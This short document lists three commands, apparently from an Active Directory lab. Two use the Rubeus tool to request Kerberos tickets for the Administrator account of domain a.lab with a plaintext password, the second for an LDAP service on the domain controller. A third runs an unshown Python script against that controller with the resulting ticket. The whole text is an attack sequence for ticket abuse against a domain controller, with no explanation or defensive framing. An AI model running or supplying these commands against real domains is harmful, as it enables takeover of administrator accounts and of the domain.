Rubeus.exe asktgt /user:Administrator  /password:qwe123... /domain:a.lab /dc:192.168.87.197 /outfile:1.kirbi
 
Rubeus.exe asktgt /user:Administrator /service:ldap/WIN-57JB297PI9L.a.lab /password:qwe123... /domain:a.lab /dc:192.168.87.197 /ticket:1.kirbi /outfile:2.kirbi

python3 1.py 192.168.87.197 WIN-57JB297PI9L.a.lab C:\Users\123\Downloads\2.kirbi s
